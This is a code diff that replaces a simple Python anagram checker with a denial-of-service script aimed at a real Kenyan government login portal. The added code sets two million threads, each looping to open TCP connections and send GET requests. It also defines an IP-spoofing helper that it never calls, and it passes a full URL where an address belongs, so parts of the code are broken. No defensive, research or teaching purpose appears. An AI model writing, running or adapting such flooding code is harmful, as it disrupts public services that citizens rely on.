@@ -1,27 +1,39 @@
- # working with anagrams
-def are_anagrams(text1, text2):
-    # removing spaces and conversion of texts into lowercase
-    cleaned_text1 = ''.join(text1.lower().split())
-    cleaned_text2 = ''.join(text2.lower().split())
+import socket
+import threading
+import random
 
-    # character sorting and comparison
-    return sorted(cleaned_text1) == sorted(cleaned_text2)
-
-# asking the input from the user
-text1 = input('Enter a string: ')
-text2 = input('Enter another string: ')
-
-# checking if hey are anagrams
-if text1 and text2:
-    if are_anagrams(text1, text2):
-        print("They are anagrams")
-
-    else:
-        print("They are not anagrams")
-else:
-    print("Empty strings are not anagrams. ")
+# Target Information
+target_ip = 'https://accounts.ecitizen.go.ke/en'  # Replace with target IP or domain
+target_port = 80  # Target port (HTTP)
+threads = 2000000 # Number of threads to use in the attack
 
 
+# Spoofed IP Address Generation
+def spoof_ip():
+    ip = f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}"
+    return ip
 
 
+# Attack function using a standard TCP socket
+def attack():
+    while True:
+        try:
+            # Create a TCP socket
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.connect((target_ip, target_port))
 
+            # Send fake GET requests
+            request = f"GET / HTTP/1.1\r\nHost: {target_ip}\r\n\r\n"
+            s.send(request.encode('ascii'))
+            s.close()
+        except socket.error as e:
+            print(f"Socket error: {e}")
+            break
+
+
+# Starting the attack with multiple threads
+for i in range(threads):
+    thread = threading.Thread(target=attack)
+    thread.start()
+
+print(f"Attacking {target_ip} on port {target_port} with {threads} threads.")
